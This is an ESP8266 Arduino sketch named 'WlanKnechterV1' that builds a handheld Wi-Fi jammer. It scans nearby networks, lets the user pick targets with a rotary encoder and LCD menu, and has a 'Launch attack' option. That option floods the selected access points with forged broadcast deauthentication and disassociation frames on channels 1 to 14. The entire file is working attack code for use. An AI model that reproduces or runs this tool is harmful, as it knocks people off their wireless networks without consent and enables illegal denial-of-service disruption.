#include "ESP8266WiFi.h"
#include <rotary.h>
#include <LiquidCrystal_I2C.h>

int lcdColumns = 16;
int lcdRows = 2;
int CLKpin = D0;
int DTpin = D5;
int SWpin = D4;
bool buttonPressed = false;

bool attacking = false;
LiquidCrystal_I2C lcd(0x27, lcdColumns, lcdRows);
Rotary rotary = Rotary(CLKpin, DTpin, SWpin);
const int maxMenuIndex = 2;
String menu[maxMenuIndex+1] = {"Search Networks","Select Networks","Attack Networks"};
int maxVal = maxMenuIndex;
String loadingMessage = "Loading...";
String backOption = "|Back|";
String selectionField_empty = "[-]";
String selectionField_filled = "[X]";
String emptyTargetListMessage = "No targets!";
String attackOption = "|Launch attack|";
String attackMessage = "|Stop attack|";
// Counter that will be incremented or decremented by rotation.
int counter = 0;

const int maxSelectedNetworks = 255;
int selectedNetworks[maxSelectedNetworks];


const int emptyValue = -88;
int networkNumber = emptyValue;

enum menus{main,network,selection,attack};

enum menus selected = main;


/*typedef struct network
{
  char ssid[sizeof(byte)];
  uint8_t* bssid;
  uint8 rssi;
  uint8 channel;
}network;*/


byte arrow[8] = {
  0b11000,
  0b11100,
  0b11110,
  0b11111,
  0b11111,
  0b11110,
  0b11100,
  0b11000
};



/*
 * The packet has this structure:
 * 0-1:   type (C0 is deauth)
 * 2-3:   duration
 * 4-9:   receiver address (broadcast)
 * 10-15: source address
 * 16-21: BSSID 
 * 22-23: sequence number
 * 24-25: reason code (1 is unspecified reason)
 */

uint8_t packet[26] = {
    0xC0, 0x00,
    0x00, 0x00,
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00,
    0x01, 0x00
};



bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t wifi_channel, uint16_t tries) {

    wifi_set_channel(wifi_channel);

    bool sent = false;

    for (int i = 0; i < tries && !sent; i++) sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;

    return sent;
}

bool deauthDevice(uint8_t* mac, uint8_t wifi_channel) {

    delay(25);
    bool success = false;

    memcpy(&packet[10], mac, 6);
    memcpy(&packet[16], mac, 6);

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }

    // send disassociate frame
    packet[0] = 0xa0;

    if (sendPacket(packet, sizeof(packet), wifi_channel, 2)) {
        success = true;
    }


    return success;
}


void setup() {
  Serial.begin(9600);
  ESP.eraseConfig();
  delay(1000);
  Serial.println("WlanKnechterV1");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  lcd.begin();
  lcd.createChar(0, arrow);
  lcd.backlight();
  lcd.setCursor(0, 0);
  lcd.print("WlanKnechterV1");
  delay(2000);
  lcd.clear();
  Serial.println(millis());
  selected = main;
  deleteListValues();
  showMainMenu();
}

bool checkIfListIsEmpty()
{
  for(int i = 0;i<maxSelectedNetworks;i++)
  {
    if(selectedNetworks[i] != emptyValue)
    {
      return false;
    }
  }
  return true;
}

void deleteListValues()
{
    for(int i = 0;i<maxSelectedNetworks;i++)
  {
    selectedNetworks[i] = emptyValue;
  
  }
}

void addSelectedNetworkToList(int n)
{
  //Serial.println("AddCalled");
  for(int i = 0;i<maxSelectedNetworks;i++)
  {
    if(selectedNetworks[i] == emptyValue)
    {
      selectedNetworks[i] = n;
      return;
      //Serial.println("added");
    }
  }
}

void removeValueFromList(int n)
{
  //Serial.println("RemoveCalled");
  for(int i = 0;i<maxSelectedNetworks;i++)
  {
    if(selectedNetworks[i] == n)
    {
      selectedNetworks[i] = emptyValue;
      //Serial.println("removed");
    }
  }
}

bool checkIfNetworkInList(int n)
{
  //Serial.println("CheckCalled");
  for(int i = 0;i<maxSelectedNetworks;i++)
  {
    if(selectedNetworks[i] == n)
    {
      //Serial.println("contained");
      return true;
    }
  }
  return false;
}

void loop() 
{
  if(getRotation())
  {
    if(buttonPressed)
    {
      if(selected == main && counter == 0)
      {
        selected = network;
        deleteListValues();
        scanWifiNetworks();        
      }
      else if(selected == main && counter == 1)
      {
        selected = selection;
        counter = 0;
        showSelectionMenu();
      }
      else if(selected == main && counter == 2)
      {
        selected = attack;
        maxVal = maxMenuIndex-1;
        counter = 0;
      }
      else if(selected == network && counter >= networkNumber)
      {
        selected = main;
        maxVal = maxMenuIndex;
        counter = 0;
      }
      else if(selected == selection && counter >= networkNumber)
      {
        selected = main;
        maxVal = maxMenuIndex;
        counter = 0;
      }
      else if(selected == selection && counter < networkNumber)
      {
        if(!checkIfNetworkInList(counter))
        {
          addSelectedNetworkToList(counter);
        }
        else
        {
          
          removeValueFromList(counter);
        }
      }
      else if(selected == attack && counter == 0)
      {
        if(!attacking)
        {
          attacking = true;
          
        }
        else
        {
          attacking = false;
          
        }
        
      }
      else if(selected == attack && counter == 1)
      {
        selected = main;
        maxVal = maxMenuIndex;
        counter = 0;
        attacking = false;
      }
      

      buttonPressed = false;
    }


    if(selected == main)
    {
      showMainMenu();
    }
    else if(selected == network)
    {
      showNetworkMenu();
    }
    else if(selected == selection)
    {
      showSelectionMenu();
    }
    else if(selected == attack)
    {
      showAttackMenu();
    }

  }

  if(attacking)
    {
      attackSelectedTargets();
    }
}

void scanWifiNetworks()
{
  lcd.clear();
  lcd.print(loadingMessage);
  networkNumber = WiFi.scanNetworks();
  maxVal = networkNumber;

}

void attackSelectedTargets()
{
     for(int i = 0;i<maxSelectedNetworks;i++)
    {
      if(selectedNetworks[i] != emptyValue)
      {
        for(int n = 1;n<15;n++)
        {
            deauthDevice(WiFi.BSSID(selectedNetworks[i]),n);
            //Serial.println("attacking "+String(WiFi.SSID(selectedNetworks[i])));
        }
      

      }
    }

}

void showAttackMenu()
{

  maxVal = maxMenuIndex-1;
  lcd.clear();
  if(counter == 0)
  {
    lcd.write(0);
    if(checkIfListIsEmpty())
  {
    lcd.print(emptyTargetListMessage);
  }
  else if(!checkIfListIsEmpty() && attacking == false)
  {
    lcd.print(attackOption);
  }
  else
  {
    maxVal = 0;
    lcd.print(attackMessage);
  }

  lcd.setCursor(1, 1);
  lcd.print(backOption);
  }

  else if(counter == 1)
  {
    lcd.setCursor(1,0);
     if(checkIfListIsEmpty())
  {
    lcd.print(emptyTargetListMessage);
  }
  else if(!checkIfListIsEmpty() && attacking == false)
  {
    lcd.print(attackOption);
  }
  else 
  {
    maxVal = 0;
    lcd.print(attackMessage);
  }
  lcd.setCursor(0,1);
  lcd.write(0);
  lcd.print(backOption);

  }  
  
}

void showNetworkMenu()
{
  //Serial.println(counter);
  //Serial.println("Networkcount:"+String(networkNumber));
  lcd.clear();

  if(counter >= networkNumber)
  {
    lcd.write(0);
    lcd.print(backOption);
  }
  else
  {
    lcd.write(0);
  lcd.print(String(counter+1)+":"+String(WiFi.SSID(counter)));
  
  int secondBeginning = 15-1-String(counter).length();
  lcd.setCursor(String(counter+1).length()+2, 1);
  //lcd.print(String(WiFi.SSID(counter).substring(secondBeginning)));
  lcd.print("RSSI:"+String(WiFi.RSSI(counter)));
  //Serial.println(String(WiFi.SSID(counter)));
  }
  
}

void showSelectionMenu()
{
    if(networkNumber == emptyValue)
    {
      scanWifiNetworks();
    }

    maxVal = networkNumber;
    lcd.clear();

    if(counter >= networkNumber)
  {
    lcd.write(0);
    lcd.print(backOption);
  }
  else
  {
    lcd.write(0);
  lcd.print(String(counter+1)+":"+String(WiFi.SSID(counter)));
  
  int secondBeginning = 15-1-String(counter).length();
  lcd.setCursor(String(counter+1).length()+2, 1);
  lcd.print(String(WiFi.SSID(counter).substring(secondBeginning)));

  lcd.setCursor(0, 1);
  
  if(checkIfNetworkInList(counter))
  {
    lcd.print(selectionField_filled);
  }
  else
  {
    lcd.print(selectionField_empty);
  }
  //lcd.print("RSSI:"+String(WiFi.RSSI(counter)));
  //Serial.println(String(WiFi.SSID(counter)));
  }
}

void showMainMenu()
{
  if(counter == 0)
  {
  lcd.clear();
  lcd.write(0);
  lcd.print(menu[counter]);
  lcd.setCursor(0, 1);
  lcd.print(" "+menu[counter+1]); 
  }
  else if(counter == 1)
  {
    lcd.clear();
    lcd.print(" "+menu[counter-1]);
    lcd.setCursor(0,1);
    lcd.write(0);
    lcd.print(menu[counter]);    
  }
  else if(counter == 2)
  {
    lcd.clear();
    lcd.write(0);
    lcd.print(menu[counter]);
  }
}

bool getRotation()
{
  bool changed = false;
  unsigned char result = rotary.process();
  if (result == DIR_CW) {

    //Serial.println("Counter increased");
    counter++;
    changed = true;
    //lcd.clear();
    //lcd.print(counter);
  } 
  else if (result == DIR_CCW) 
  {

    counter--;
    changed = true;
    //lcd.clear();
    //lcd.print(counter);
  }
   if(counter > maxVal)
    {
      counter = maxVal;
      changed = false;

    }
    else if(counter < 0)
    {
      counter = 0;
      changed = false;
    }

    //Serial.println(counter);
    if (rotary.buttonPressedReleased(20)) 
    {
        //Serial.println("Press detected");
        buttonPressed = true;
        changed = true;
    }
    return changed;
}

/*int scanNetworks(int networksListSize)
{  
  Serial.println(millis());
  Serial.printf("%d network(s) found\n", networksListSize);
  for (int i = 0; i < networksListSize; i++)
  {
  
    //Serial.printf("%d: %s, Ch:%d (%ddBm) %s\n", i + 1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.RSSI(i), WiFi.encryptionType(i) == ENC_TYPE_NONE ? "open" : "");
  }


  return networksListSize;
 
}*/
